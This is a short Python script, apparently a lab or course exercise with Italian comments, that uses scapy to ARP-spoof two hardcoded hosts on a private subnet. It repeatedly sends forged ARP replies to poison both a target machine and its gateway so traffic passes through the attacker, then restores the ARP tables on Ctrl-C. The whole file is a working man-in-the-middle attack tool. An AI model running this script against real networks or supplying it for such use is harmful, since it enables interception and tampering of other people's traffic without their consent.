import time
import sys
import scapy.all as scapy

#scapy.ls(scapy.ARP())

#print(packet.show())
#print(packet.summary())

def spoof(dst_ip, src_ip):
    packet = scapy.ARP()
    packet.pdst = dst_ip
    packet.hwdst = get_mac(dst_ip) #ottengo il mac_address dell'indirizzo Ip di destinazione che voglio variare
    packet.psrc = src_ip
    packet.op = 2
    scapy.send(packet, verbose = False)



def get_mac(ip_address):
    #scapy.arping(ip_address)

    broadcast = scapy.Ether(dst = "FF:FF:FF:FF:FF:FF")

    arp_request = scapy.ARP()
    arp_request.pdst = ip_address

    #scapy.ls(scapy.ARP)

    arp_request_broadcast = broadcast / arp_request
    answered = scapy.srp(arp_request_broadcast,timeout = 1, verbose = False)[0]
    '''
    print('----------------------------------------')
    print('IP\t\t\tMAC address\t|')
    print('----------------------------------------')
    '''
    mac_address = answered[0][1].src
    return mac_address

def restore(dst_ip, src_ip):
    packet = scapy.ARP()
    packet.pdst = dst_ip
    packet.hwdst = get_mac(dst_ip)
    packet.hwsrc = get_mac(src_ip)
    packet.psrc = src_ip
    packet.op = 2
    scapy.send(packet, verbose=False, count = 4)


def main():
    n = 0
    while True:
        n += 2
        try:
            spoof('192.168.186.149', '192.168.186.2')
            spoof('192.168.186.2', '192.168.186.149')
            time.sleep(2) #per evitare di inviare pacchetti in continuazione
            # PYTHON 3
            print("[+] " + str(n) + " packet sent", end="\r")
        except KeyboardInterrupt:
            print("[+] Re-arping targets")
            restore('192.168.186.149', '192.168.186.2')
            restore('192.168.186.2', '192.168.186.149')
            print("[-] Quitting")
            break

        '''
        #PYTHON 2
        print("\r [+] " + str(n) + " packet sent"),
        sys.stdout.flush()
        '''


if __name__ == '__main__' :
    main()